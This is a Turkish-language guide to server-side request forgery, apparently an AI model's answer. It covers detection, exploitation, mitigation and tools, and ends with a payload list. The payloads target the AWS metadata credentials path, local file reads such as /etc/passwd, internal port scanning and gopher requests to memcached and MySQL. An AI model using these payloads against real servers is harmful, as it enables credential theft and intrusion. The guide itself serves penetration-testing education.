SSRF (Server-Side Request Forgery) zafiyeti, bir saldırganın hedef sunucu üzerinde kendi belirlediği URL'lere istek göndermesini sağladığı bir zafiyettir. SSRF zafiyetini tespit etmek, istismar etmek ve bu süreçte kullanılan araçlar ve yöntemleri öğrenmek için aşağıda kapsamlı bir rehber bulunmaktadır.

---

### **1. SSRF Nedir?**
- **Tanım**: SSRF, bir uygulamanın gelen kullanıcı girdisine dayanarak ağ içindeki kaynaklara (yerel veya uzak) erişmesi durumunda oluşur. Örneğin, bir URL alıp o URL'ye istek gönderen bir fonksiyon varsa bu durum SSRF'ye yol açabilir.
- **Tehlikeleri**:
  - İç ağ taraması yapılabilir.
  - Yetkili servislerin arkasında çalıştırılabilir.
  - AWS Metadata gibi hassas bilgileri elde edilebilir.

---

### **2. SSRF'nin Tespiti**
#### **2.1. Potansiyel Giriş Noktalarını Belirleme**
- **URL parametreleri**: Örnek: `/image?url=`
- **Post Data**: Örnek: `POST /upload HTTP/1.1` içinde gönderilen URL'ler.
- **HTTP Header'ları**: Örnek: `X-Forwarded-Host`, `Referer`, `Host`.
- **API istekleri**: JSON veya XML tabanlı API endpointleri.

#### **2.2. Fuzzing**
SSRF'nin tespiti için aşağıdaki payloadlarla uygulama test edilir:
```plaintext
http://127.0.0.1
http://localhost
http://169.254.169.254/latest/meta-data/
http://internal-service:8080/
file:///etc/passwd
```

#### **2.3. Test Araçları**
- **Burp Suite**: Proxy üzerinden gönderilen istekleri yakalayarak URL tabanlı parametreleri değiştirebilirsiniz.
- **OWASP ZAP**: URL manipülasyonu yaparak SSRF testi için kullanılabilir.
- **ffuf veya dirb**: Fuzzing için kullanılır.
- **nmap**: İç ağ taraması yapabilmek için SSRF üzerinden kullanılabilir.

---

### **3. SSRF'nin İstismarı**
#### **3.1. İç Ağ Keşfi**
SSRF, genellikle iç ağda bulunan gizli servisleri keşfetmek için kullanılır:
- Payload: `http://192.168.1.1:22/` veya `http://192.168.1.1:3306/`
- **Hedefler**:
  - İçeride çalışan HTTP servisler.
  - Veritabanları (PostgreSQL, MySQL).
  - Yönetim panelleri (Grafana, Kibana, Jenkins).

#### **3.2. AWS Metadata Bilgilerine Erişim**
AWS üzerindeki sunucular genellikle metadata bilgilerini bir endpoint üzerinden sunar:
- Payload: `http://169.254.169.254/latest/meta-data/`
- Amaç: AWS Access Key, Secret Key, Token bilgilerini elde etmek.

#### **3.3. Dosya Okuma (File Read SSRF)**
Bazı SSRF vakaları dosya okuma için kullanılabilir:
- Payload: `file:///etc/passwd` veya `file:///c:/windows/system32/drivers/etc/hosts`

#### **3.4. Port Tarama**
Bir hedefin açık portlarını tarayabilirsiniz:
- Payload: `http://192.168.1.1:22/`
- **Araç**: SSRFmap gibi araçlarla otomatik port taraması yapılabilir.

#### **3.5. DNS Rebinding**
DNS rebinding ile hedef iç ağ üzerinde bir etki alanı adına istekte bulunulabilir:
- Örnek: `http://your-dns-rebind-server/`

#### **3.6. Reverse Shell**
Bazı durumlarda SSRF, uzaktan kod yürütmek için kullanılabilir:
- HTTP endpointleri aracılığıyla bir ters bağlantı (reverse shell) oluşturmak.

---

### **4. SSRF Önleme ve Mitigasyon**
#### **4.1. Kullanıcı Girdilerini Doğrulama**
- Beyaz listeleme: İzin verilen domainleri ve protokolleri kontrol edin.
- Doğrudan bağlantılara izin vermeyin (örneğin, `localhost`, `127.0.0.1`).

#### **4.2. Ağ Seviyesi Güvenlik**
- Çıkış trafiğini sınırlayın.
- Metadata servislerine erişimi engelleyin (`169.254.169.254`).

#### **4.3. Güvenlik Testleri**
- Dinamik analiz araçlarını kullanarak test yapın.
- SSRF açığına karşı hazırlanmış payloadları düzenli olarak test edin.

---

### **5. Araçlar ve Teknikler**
| Araç           | Kullanım Amacı                                    |
|----------------|---------------------------------------------------|
| Burp Suite     | HTTP isteği yakalamak ve değiştirmek.             |
| OWASP ZAP      | Web uygulamalarında otomatik zafiyet analizi.     |
| SSRFmap        | SSRF üzerinden port tarama ve veri elde etme.     |
| ffuf           | URL parametrelerini brute force için kullanılır.  |
| Gopherus       | SSRF ile gopher protokolünü manipüle eder.        |
| Metasploit     | SSRF ile istismar için modüller içerir.           |

---

### **6. SSRF Payload Bankası**
#### **Yerel ve Uzak**
```plaintext
http://localhost:80
http://127.0.0.1:22
http://192.168.1.1:8080
http://internal-service.domain.local
```

#### **AWS Metadata**
```plaintext
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

#### **File Protocol**
```plaintext
file:///etc/passwd
file:///c:/windows/system32/drivers/etc/hosts
```

#### **Gopher Protocol**
```plaintext
gopher://127.0.0.1:11211/_stats
gopher://127.0.0.1:3306/_SELECT%201
```

---

Bu rehber, SSRF zafiyetlerini daha etkili bir şekilde anlamanıza ve istismar etmenize yardımcı olacak teknikleri sunar. İhtiyaç duyduğunuz daha fazla detay için her bir aşamayı örneklerle test edebiliriz.
